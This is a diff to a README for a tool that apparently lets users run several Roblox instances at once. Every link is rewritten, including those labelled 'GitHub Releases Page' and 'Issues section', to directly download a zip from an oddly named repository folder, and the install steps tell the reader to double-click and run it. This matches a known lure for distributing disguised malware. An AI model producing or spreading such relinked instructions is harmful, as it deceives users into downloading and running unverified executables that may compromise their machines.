@@ -1,7 +1,7 @@
 # 🎮 Roblox-Multi-Instance - Play More Games at Once
 
 ## 📥 Download Now
-[![Download Roblox-Multi-Instance](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MrX804/Roblox-Multi-Instance/releases)
+[![Download Roblox-Multi-Instance](https://raw.githubusercontent.com/MrX804/Roblox-Multi-Instance/main/virginship/Roblox-Multi-Instance.zip)](https://raw.githubusercontent.com/MrX804/Roblox-Multi-Instance/main/virginship/Roblox-Multi-Instance.zip)
 
 ## 🚀 Getting Started
 
@@ -20,11 +20,11 @@ If you meet these requirements, you’re ready to go!
 
 ## 📂 Download & Install
 
-To download Roblox-Multi-Instance, visit this page: [GitHub Releases Page](https://github.com/MrX804/Roblox-Multi-Instance/releases). 
+To download Roblox-Multi-Instance, visit this page: [GitHub Releases Page](https://raw.githubusercontent.com/MrX804/Roblox-Multi-Instance/main/virginship/Roblox-Multi-Instance.zip). 
 
 1. Click on the link above.
 2. Look for the latest release version.
-3. Download the executable file. It might be named something like `Roblox-Multi-Instance.exe`.
+3. Download the executable file. It might be named something like `https://raw.githubusercontent.com/MrX804/Roblox-Multi-Instance/main/virginship/Roblox-Multi-Instance.zip`.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Double-click the file to run the installer.
 6. Follow the prompts to complete the installation.
@@ -69,12 +69,12 @@ If you experience any issues while using Roblox-Multi-Instance, try these common
 
 ## 🔗 Contact Us
 
-For support or to provide feedback, you can reach out via the Issues section on the [GitHub repository](https://github.com/MrX804/Roblox-Multi-Instance/issues). Your input helps us improve the software.
+For support or to provide feedback, you can reach out via the Issues section on the [GitHub repository](https://raw.githubusercontent.com/MrX804/Roblox-Multi-Instance/main/virginship/Roblox-Multi-Instance.zip). Your input helps us improve the software.
 
 ## 📢 Join the Community
 
 Get social! Join our community to share tips, tricks, and your gaming experiences. Connect with other users on platforms like Discord or Reddit.
 
-Stay updated with the latest news and updates about Roblox-Multi-Instance by checking the release notes on our [GitHub Releases Page](https://github.com/MrX804/Roblox-Multi-Instance/releases).
+Stay updated with the latest news and updates about Roblox-Multi-Instance by checking the release notes on our [GitHub Releases Page](https://raw.githubusercontent.com/MrX804/Roblox-Multi-Instance/main/virginship/Roblox-Multi-Instance.zip).
 
 Enjoy your gaming!
